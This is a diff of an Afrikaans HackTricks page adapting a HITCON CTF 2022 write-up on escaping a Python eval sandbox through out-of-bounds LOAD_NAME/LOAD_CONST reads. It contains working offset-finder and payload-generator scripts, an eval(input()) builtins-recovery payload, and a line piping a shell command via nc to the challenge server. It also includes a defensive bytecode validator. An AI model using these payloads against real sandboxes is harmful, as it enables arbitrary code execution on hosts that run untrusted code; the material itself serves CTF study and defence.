@@ -1,31 +1,33 @@
 # LOAD_NAME / LOAD_CONST opcode OOB Read
 
-Hierdie bladsy pas Splitline se oorspronklike HITCON CTF 2022 "V O I D"-writeup en exploit chain aan.<sup>[[1]](#references)</sup>
+{{#include ../../../banners/hacktricks-training.md}}
+
+Hierdie bladsy pas Splitline se oorspronklike HITCON CTF 2022 "V O I D" writeup en exploit chain aan.<sup>[[1]](#references)</sup>
 
 ### TL;DR <a href="#tldr-2" id="tldr-2"></a>
 
-'n `LOAD_NAME`- of `LOAD_CONST`-operand kan buite 'n doelbewus verkorte `co_names`- of `co_consts`-tuple lees. In hierdie uitdaging word onbereikbare dummy names gebruik totdat 'n nabygeleë entry 'n nuttige attribute soos `__getattribute__` bevat.<sup>[[1]](#references)</sup>
+'n `LOAD_NAME`- of `LOAD_CONST`-operand kan buite 'n doelbewus verkorte `co_names`- of `co_consts`-tuple lees. In hierdie uitdaging word onbereikbare dummy names gebruik totdat 'n nabygeleë inskrywing 'n nuttige attribute soos `__getattribute__` bevat.<sup>[[1]](#references)</sup>
 
-Die oorblywende payload hergebruik daardie herwonne name om 'n sandbox escape te bou.<sup>[[1]](#references)</sup>
+Die oorblywende payload hergebruik daardie herwonne naam om 'n sandbox escape te bou.<sup>[[1]](#references)</sup>
 
 ### Oorsig <a href="#overview-1" id="overview-1"></a>
 
-Die challenge wrapper is kort en compile een expression voordat dit geëvalueer word:<sup>[[1]](#references)</sup>
+Die uitdaging se wrapper is kort en compileer een uitdrukking voordat dit evalueer word:<sup>[[1]](#references)</sup>
 ```python
 source = input('>>> ')
 if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
 code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
 print(eval(code, {'__builtins__': {}}))
 ```
-Die input word na 'n Python code object gekompileer, waarna die wrapper sy `co_consts` en `co_names` met leë tuples vervang voordat `eval` geroep word.<sup>[[1]](#references)[[5]](#references)</sup>
+Die invoer word in ’n Python-kodeobjek saamgestel, waarna die wrapper sy `co_consts` en `co_names` met leë tuples vervang voordat `eval` geroep word.<sup>[[1]](#references)[[5]](#references)</sup>
 
-Enige gegenereerde instruction wat steeds een van daardie tabelle indekseer, kan die interpreter laat crash of 'n aangrensende object pointer blootlê, afhangend van die build.<sup>[[1]](#references)</sup>
+Enige gegenereerde instruksie wat steeds een van daardie tabelle indekseer, kan die interpreter laat crash of ’n aangrensende objekpointer blootlê, afhangend van die build.<sup>[[1]](#references)</sup>
 
 ### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>
 
 Hoe gebeur die segfault?
 
-Vir 'n list expression soos `[a, b, c]` genereer die compiler `LOAD_NAME` instructions met opeenvolgende operands:<sup>[[1]](#references)[[2]](#references)</sup>
+Vir ’n lysuitdrukking soos `[a, b, c]` genereer die compiler `LOAD_NAME`-instruksies met opeenvolgende operands:<sup>[[1]](#references)[[2]](#references)</sup>
 ```
 1           0 LOAD_NAME                0 (a)
 2 LOAD_NAME                1 (b)
@@ -33,11 +35,11 @@ Vir 'n list expression soos `[a, b, c]` genereer die compiler `LOAD_NAME` instru
 6 BUILD_LIST               3
 8 RETURN_VALUE
 ```
-As `co_names` deur `()` vervang word, dra die bytecode steeds `LOAD_NAME 2`; ’n ongekontroleerde tuple-toegang kan dus ’n pointer buite die tuple haal in plaas daarvan om `IndexError` te veroorsaak.<sup>[[1]](#references)[[3]](#references)</sup>
+As `co_names` met `()` vervang word, bevat die bytecode steeds `LOAD_NAME 2`; ’n onkontroleerde tuple-toegang kan dus ’n pointer buite die tuple haal in plaas daarvan om `IndexError` te veroorsaak.<sup>[[1]](#references)[[3]](#references)</sup>
 
 `LOAD_NAME` en `LOAD_CONST` is die kernprimitiewe hier: hul heelgetaloperande kies onderskeidelik inskrywings in `co_names` en `co_consts`.<sup>[[1]](#references)[[2]](#references)</sup>
 
-In CPython se dispatch haal `LOAD_CONST` die geselekteerde tuple-inskrywing op en plaas dit op die stack; release builds gebruik ’n ongekontroleerde tuple-accessor:<sup>[[3]](#references)</sup>
+In CPython se dispatch haal `LOAD_CONST` die geselekteerde tuple-inskrywing op en plaas dit op die stack; release builds gebruik ’n onkontroleerde tuple-accessor:<sup>[[3]](#references)</sup>
 ```c
 case TARGET(LOAD_CONST): {
 PREDICTED(LOAD_CONST);
@@ -47,22 +49,22 @@ PUSH(value);
 FAST_DISPATCH();
 }
 ```
-Toets toenemende `LOAD_NAME`-operande op die teikeninterpreter om bruikbare inskrywings te karteer. Splitline het bruikbare offsets bo 700 in die challenge-omgewing waargeneem, maar die uitleg is build-specific; ’n debugger kan help om die omliggende geheue te inspekteer.<sup>[[1]](#references)</sup>
+Toets toenemende `LOAD_NAME`-operande op die teikeninterpreter om bruikbare inskrywings te karteer. Splitline het bruikbare offsets bo 700 in die challenge-omgewing waargeneem, maar die uitleg is build-spesifiek; ’n debugger kan help om die omliggende geheue te inspekteer.<sup>[[1]](#references)</sup>
 
-### Generating the Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>
+### Generering van die Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>
 
-Sodra ’n offset ’n bruikbare naam lewer, plaas die lookup buite die reeks in ’n onbereikbare uitdrukking en verwys na dieselfde `co_names`-slot vanaf ’n bereikbare attribute access.<sup>[[1]](#references)</sup>
+Sodra ’n offset ’n bruikbare naam oplewer, plaas die out-of-range lookup in ’n onbereikbare uitdrukking en verwys na dieselfde `co_names`-gleuf vanuit ’n bereikbare attribuuttoegang.<sup>[[1]](#references)</sup>
 
-Byvoorbeeld, as offset 5 `__getattribute__` lewer, behou daardie naam in slot 5 terwyl die false branch die bruikbare lookup uitvoer:<sup>[[1]](#references)</sup>
+Byvoorbeeld, as offset 5 `__getattribute__` oplewer, hou daardie naam in gleuf 5 terwyl die vals tak die bruikbare lookup uitvoer:<sup>[[1]](#references)</sup>
 ```python
 [a,b,c,d,e,__getattribute__] if [] else [
 [].__getattribute__
 # you can get the __getattribute__ method of list object now!
 ]
 ```
-> Die herwonne teks hoef nie `__getattribute__` te wees nie; enige identifiseerder wat die payload dien, kan die plek inneem.<sup>[[1]](#references)</sup>
+> Die herstelde teks hoef nie `__getattribute__` te wees nie; enige identifier wat die payload bevat, kan die plek inneem.<sup>[[1]](#references)</sup>
 
-Die compiler hergebruik ’n `co_names`-plek vir herhaalde voorkomste van een naam, soos die disassembly illustreer:<sup>[[1]](#references)[[2]](#references)</sup>
+Die compiler hergebruik ’n `co_names`-slot vir herhaalde voorkomste van dieselfde naam, soos die disassembly illustreer:<sup>[[1]](#references)[[2]](#references)</sup>
 ```python
 0 BUILD_LIST               0
 2 POP_JUMP_IF_FALSE       20
@@ -79,9 +81,9 @@ Die compiler hergebruik ’n `co_names`-plek vir herhaalde voorkomste van een na
 24 BUILD_LIST               1
 26 RETURN_VALUE
 ```
-Omdat `LOAD_ATTR` sy naam ook deur `co_names` oplos, kan die bereikbare tak daardie gleuf hergebruik; gepakte operands op nuwer CPython-weergawes word in die weergawe-aantekeninge hieronder beskryf.<sup>[[1]](#references)[[2]](#references)</sup>
+Omdat `LOAD_ATTR` sy naam ook deur `co_names` oplos, kan die bereikbare vertakking daardie slot hergebruik; gepakte operande op nuwer CPython-weergawes word in die weergawe-notas hieronder beskryf.<sup>[[1]](#references)[[2]](#references)</sup>
 
-Klein nie-negatiewe heelgetalle kan sonder konstantes uit boolean-uitdrukkings saamgestel word:<sup>[[1]](#references)</sup>
+Klein nie-negatiewe heelgetalle kan met Boolese uitdrukkings sonder constants saamgestel word:<sup>[[1]](#references)</sup>
 
 - 0: not \[\[]]
 - 1: not \[]
@@ -90,9 +92,9 @@ Klein nie-negatiewe heelgetalle kan sonder konstantes uit boolean-uitdrukkings s
 
 ### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>
 
-Die oorspronklike exploit het name eerder as konstantes gebruik om binne die uitdaging se lengtebeperking te bly.<sup>[[1]](#references)</sup>
+Die oorspronklike exploit het names eerder as constants gebruik om binne die uitdaging se lengtebeperking te bly.<sup>[[1]](#references)</sup>
 
-Hierdie helper skandeer kandidaatnaam-offsets deur ’n code object met ’n leë `co_names`-tuple te konstrueer.<sup>[[1]](#references)</sup>
+Hierdie helper skandeer kandidaat-name-offsets deur ’n code object met ’n leë `co_names`-tuple te konstrueer.<sup>[[1]](#references)</sup>
 ```python
 from types import CodeType
 from opcode import opmap
@@ -127,7 +129,7 @@ print(f'{n}: {ret}')
 
 # for i in $(seq 0 10000); do python find.py $i ; done
 ```
-Die generator hieronder koppel die herwonne offsets aan name en genereer die bronvlak-payload.<sup>[[1]](#references)</sup>
+Die generator hieronder karteer die herstelde offsets na name en genereer die bronvlak-payload.<sup>[[1]](#references)</sup>
 ```python
 import sys
 import unicodedata
@@ -204,7 +206,7 @@ print(source)
 # (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
 ```
-Op 'n hoë vlak verkry die gegenereerde payload 'n funksie se globals, herwin dit `builtins`, en roep `eval(input())` aan.<sup>[[1]](#references)</sup>
+Op ’n hoë vlak verkry die gegenereerde payload ’n funksie se globale naamruimte, herwin `builtins` en roep `eval(input())` aan.<sup>[[1]](#references)</sup>
 ```python
 getattr = (None).__getattribute__('__class__').__getattribute__
 builtins = getattr(
@@ -221,17 +223,17 @@ builtins['eval'](builtins['input']())
 
 ### Weergawe-aantekeninge en geaffekteerde opcodes (Python 3.11–3.13)
 
-- Op CPython 3.11–3.13 gebruik instructions steeds integer-operands om die code object's constant- en name-tables te indexeer. As enige tuple korter is as 'n gerefereerde index, kan 'n ongekontroleerde access 'n aangrensende object pointer lees en crash of daarop werk; die presiese gedrag hang van die interpreter build af.<sup>[[2]](#references)[[3]](#references)</sup>
+- Op CPython 3.11–3.13 gebruik instruksies steeds heelgetal-operande om die konstante- en naamtabelle van die kode-objek te indekseer. As enige tuple korter is as ’n indeks waarna verwys word, kan ’n ongekontroleerde toegang ’n aangrensende objek-aanwyser lees en ’n crash veroorsaak of daarop opereer; die presiese gedrag hang van die interpreter-bou af.<sup>[[2]](#references)[[3]](#references)</sup>
 - `LOAD_CONST consti` en (3.12+) `RETURN_CONST consti` lees `co_consts[consti]`.<sup>[[2]](#references)</sup>
-- Direkte name-table gebruikers sluit `LOAD_NAME`, `STORE_NAME`, `DELETE_NAME`, `STORE_GLOBAL`, `DELETE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `STORE_ATTR`, `DELETE_ATTR`, en (3.12+) `LOAD_FROM_DICT_OR_GLOBALS` in.<sup>[[2]](#references)</sup>
-- `LOAD_GLOBAL namei` en `LOAD_ATTR namei` gebruik `co_names[namei >> 1]`; die lae bit beheer die gedokumenteerde NULL/method gedrag. (3.12+) `LOAD_SUPER_ATTR namei` gebruik `co_names[namei >> 2]` en pak twee flags in sy lae bits.<sup>[[2]](#references)</sup>
-- Python 3.11+ het adaptive/inline caches bekendgestel wat versteekte `CACHE` entries tussen instructions byvoeg. Handcrafted bytecode moet hierdie entries in ag neem wanneer `co_code` gebou word.<sup>[[2]](#references)</sup>
+- Direkte gebruikers van die naamtabel sluit in `LOAD_NAME`, `STORE_NAME`, `DELETE_NAME`, `STORE_GLOBAL`, `DELETE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `STORE_ATTR`, `DELETE_ATTR`, en (3.12+) `LOAD_FROM_DICT_OR_GLOBALS`.<sup>[[2]](#references)</sup>
+- `LOAD_GLOBAL namei` en `LOAD_ATTR namei` gebruik `co_names[namei >> 1]`; die lae bis beheer die gedokumenteerde NULL/metode-gedrag. (3.12+) `LOAD_SUPER_ATTR namei` gebruik `co_names[namei >> 2]` en pak twee vlae in sy lae bisse.<sup>[[2]](#references)</sup>
+- Python 3.11+ het adaptiewe/inline caches bekendgestel wat versteekte `CACHE`-inskrywings tussen instruksies byvoeg. Handgemaakte bytecode moet hierdie inskrywings in ag neem wanneer `co_code` gebou word.<sup>[[2]](#references)</sup>
 
-Praktiese implikasie: bytecode-layout en herwonne offsets is release- en build-spesifiek. Toets die technique en enige gegenereerde payload teen die teiken se CPython-weergawe voordat jy daarop staatmaak.<sup>[[2]](#references)</sup>
+Praktiese implikasie: bytecode-uitleg en herwonne offsets is vrystelling- en bou-spesifiek. Toets die tegniek en enige gegenereerde payload teen die teiken se CPython-weergawe voordat jy daarop staatmaak.<sup>[[2]](#references)</sup>
 
-### Vinnige scanner vir nuttige OOB-indekse (versoenbaar met 3.11+/3.12+)
+### Vinnige skandeerder vir nuttige OOB-indekse (versoenbaar met 3.11+/3.12+)
 
-As jy verkies om direk vanaf bytecode vir interessante objects te probe eerder as vanaf high-level source, kan jy minimale code objects genereer en indices brute-force. Die helper hieronder voeg inline caches volgens die teikeninterpreter se `dis` metadata in.<sup>[[2]](#references)</sup>
+As jy verkies om direk vanaf bytecode vir interessante objekte te soek eerder as vanaf hoëvlakbronkode, kan jy minimale kode-objekte genereer en indekse brute-force. Die helper hieronder voeg inline caches in volgens die teiken-interpreter se `dis`-metadata.<sup>[[2]](#references)</sup>
 ```python
 import dis, types
 
@@ -271,12 +273,12 @@ if obj is not None:
 print(idx, type(obj), repr(obj)[:80])
 ```
 Notas
-- Om eerder name te ondersoek, vervang `LOAD_CONST` met `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` en pas die stack-gebruik en gepakte operand vir die teikenopcode aan.<sup>[[2]](#references)</sup>
-- Gebruik `EXTENDED_ARG` of veelvuldige grepe van `arg` om indekse >255 te bereik indien nodig. Hierdie helper lewer slegs die lae operand-greep uit, dus vereis groter indekse rou greep-konstruksie of veelvuldige loads.<sup>[[2]](#references)</sup>
+- Om eerder name te toets, vervang `LOAD_CONST` met `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` en pas die stack-gebruik en gepakte operand vir die teikenopcode aan.<sup>[[2]](#references)</sup>
+- Gebruik `EXTENDED_ARG` of veelvuldige grepe van `arg` om indekse >255 te bereik indien nodig. Hierdie helper stuur slegs die lae operand-greep uit, dus vereis groter indekse rou greep-konstruksie of veelvuldige loads.<sup>[[2]](#references)</sup>
 
 ### Minimale bytecode-only RCE-patroon (co_consts OOB → builtins → eval/input)
 
-Sodra jy ’n `co_consts`-indeks identifiseer wat na die builtins-module oplos, kan jy `eval(input())` sonder `co_names` rekonstrueer deur die stack te manipuleer. Die amptelike B01lers CTF 2024 `awpcode`-materiaal dokumenteer dieselfde OOB-read-patroon.<sup>[[4]](#references)</sup>
+Sodra jy ’n `co_consts`-indeks identifiseer wat na die builtins-module resolve, kan jy `eval(input())` sonder `co_names` rekonstrueer deur die stack te manipuleer. Die amptelike B01lers CTF 2024 `awpcode`-materiaal dokumenteer dieselfde OOB-read-patroon.<sup>[[4]](#references)</sup>
 ```python
 # Build co_code that:
 # 1) LOAD_CONST <builtins_idx> → push builtins module
@@ -285,13 +287,13 @@ Sodra jy ’n `co_consts`-indeks identifiseer wat na die builtins-module oplos, 
 # 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
 # This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
 ```
-Hierdie stack-only-benadering is nuttig wanneer ’n challenge jou direkte beheer oor `co_code` gee terwyl `co_consts=()` en `co_names=()` afgedwing word; dit vermy source-level tricks en kan payloads klein hou deur bytecode stack operations en tuple builders te gebruik.<sup>[[4]](#references)</sup>
+Hierdie stack-only-benadering is nuttig wanneer ’n challenge jou direkte beheer oor `co_code` gee terwyl `co_consts=()` en `co_names=()` afgedwing word; dit vermy source-level tricks en kan payloads klein hou deur bytecode-stackbewerkings en tuple-builders te gebruik.<sup>[[4]](#references)</sup>
 
 ### Defensiewe kontroles en mitigations vir sandboxes
 
-As jy ’n Python sandbox skryf wat untrusted code compile of evaluate, moenie op CPython staatmaak om tuple indexes wat deur bytecode gebruik word, binne die grense te kontroleer nie. Valideer code objects voordat jy dit execute.<sup>[[2]](#references)[[3]](#references)</sup>
+As jy ’n Python-sandbox skryf wat untrusted code compileer of evalueer, moenie op CPython staatmaak om tuple-indekse wat deur bytecode gebruik word, binne perke te kontroleer nie. Valideer code objects voordat jy hulle uitvoer.<sup>[[2]](#references)[[3]](#references)</sup>
 
-Praktiese validator (verwerp OOB access tot co_consts/co_names).<sup>[[2]](#references)</sup>
+Praktiese validator (verwerp OOB-toegang tot co_consts/co_names).<sup>[[2]](#references)</sup>
 ```python
 import dis
 
@@ -330,14 +332,14 @@ raise ValueError("Bytecode refers to name index beyond co_names length")
 # eval(c, {'__builtins__': {}})
 ```
 Bykomende mitigation-idees
-- Moenie arbitrêre `CodeType.replace(...)` op untrusted input toelaat nie, of voeg streng strukturele kontroles by op die resulterende code object.
-- Oorweeg dit om untrusted code in ’n aparte proses met OS-level sandboxing (seccomp, job objects, containers) uit te voer eerder as om op CPython-semantiek staat te maak.
+- Moenie arbitrêre `CodeType.replace(...)` op onbetroubare invoer toelaat nie, of voeg streng strukturele kontroles by die resulterende code object.
+- Oorweeg dit om onbetroubare code in ’n aparte proses met OS-vlak-sandboxing (seccomp, job objects, containers) uit te voer, eerder as om op CPython-semantiek staat te maak.
 
 ## References
 
-- [1] [Splitline se HITCON CTF 2022 writeup "V O I D" (oorsprong van hierdie technique en hoëvlak-exploit chain)](https://blog.splitline.tw/hitcon-ctf-2022/)
-- [2] [Python 3.13 `dis`-dokumentasie (bytecode-indekse, packed name-operands en inline caches)](https://docs.python.org/3.13/library/dis.html)
-- [3] [CPython 3.13.5 tuple-access-makro’s (`GETITEM`)](https://github.com/python/cpython/blob/v3.13.5/Python/ceval_macros.h#L133-L143)
+- [1] [Splitline se HITCON CTF 2022 writeup "V O I D" (oorsprong van hierdie tegniek en die exploit chain op hoë vlak)](https://blog.splitline.tw/hitcon-ctf-2022/)
+- [2] [Python 3.13 `dis`-dokumentasie (bytecode-indekse, packed name operands en inline caches)](https://docs.python.org/3.13/library/dis.html)
+- [3] [CPython 3.13.5 tuple-access macros (`GETITEM`)](https://github.com/python/cpython/blob/v3.13.5/Python/ceval_macros.h#L133-L143)
 - [4] [B01lers CTF 2024 `awpcode` challenge writeup (CygnusX)](https://github.com/b01lers/b01lers-ctf-2024-public/tree/main/misc/awpcode)
 - [5] [Python C API: Code Objects](https://docs.python.org/3/c-api/code.html)
 {{#include ../../../banners/hacktricks-training.md}}
